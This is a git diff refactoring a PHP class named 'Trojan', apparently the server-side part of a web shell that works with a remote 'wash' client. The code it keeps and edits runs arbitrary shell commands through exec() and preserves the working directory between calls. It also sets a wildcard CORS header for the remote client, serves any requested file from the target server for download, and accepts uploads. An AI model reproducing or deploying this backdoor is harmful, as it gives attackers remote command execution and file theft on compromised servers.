@@ -6,8 +6,6 @@ class Trojan{
     private $command         = '';
     private $cwd             = '';
     private $payloads        = array();
-    // do I need this?
-    private $output_raw      = array();
     private $response        = array(
         'error'          => null,
         'output'         => null,
@@ -79,14 +77,14 @@ class Trojan{
         /* @note: In order to get current directory persistence to work, I need 
          * to inject some `cd` and `pwd` commands around the command sent from 
          * the wash client. */
-
-        $command  = "cd {$this->cwd}; $command 2>&1; pwd";
-        exec($command, $this->output_raw);
+        $command    = "cd {$this->cwd}; $command 2>&1; pwd";
+        $output_raw = array();
+        exec($command, $output_raw);
 
         # buffer the results
-        $this->cwd = array_pop($this->output_raw);
+        $this->cwd      = array_pop($output_raw);
         $this->response = array(
-            'output'         => join($this->output_raw, "\n"),
+            'output'         => join($output_raw, "\n"),
             'prompt_context' => $this->get_prompt_context(),
         );
 
@@ -104,13 +102,6 @@ class Trojan{
         /* This header prevents the wash client from malfunctioning due to the 
          * Same-Origin Policy. @see: http://enable-cors.org/ */
         header('Access-Control-Allow-Origin: *');
-
-        # configure the response to send
-        $this->response = array(
-            'error'          => $this->response['error'],
-            'output'         => $this->response['output'],
-            'prompt_context' => $this->response['prompt_context'],
-        );
 
         # assemble and send a JSON-encoded response
         echo json_encode($this->response);
@@ -144,19 +135,18 @@ class Trojan{
      */
     public function payload_file_down($args){
         # emulate directory persistence
-        $file = $args['file'];
         chdir($this->cwd);
         # if the requested file exists, serve it up to the user
-        if(file_exists($file)){
+        if(file_exists($args['file'])){
             header('Content-Description: File Transfer');
             header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename='.basename($file));
+            header('Content-Disposition: attachment; filename='.basename($args['file']));
             header('Content-Transfer-Encoding: binary');
             //header('Expires: 0');
             //header('Cache-Control: must-revalidate');
             //header('Pragma: public');
-            //header('Content-Length: ' . filesize($file));
-            readfile($file);
+            //header('Content-Length: ' . filesize($args['file']));
+            readfile($args['file']);
         }
         
         # if not, provide a notification
@@ -208,7 +198,6 @@ class Trojan{
      * Uploads files to the target server
      */
     public function payload_file_up($args){
-        $out = json_encode($_FILES);
         $out = json_encode($_FILES);
 
         # assemble a response
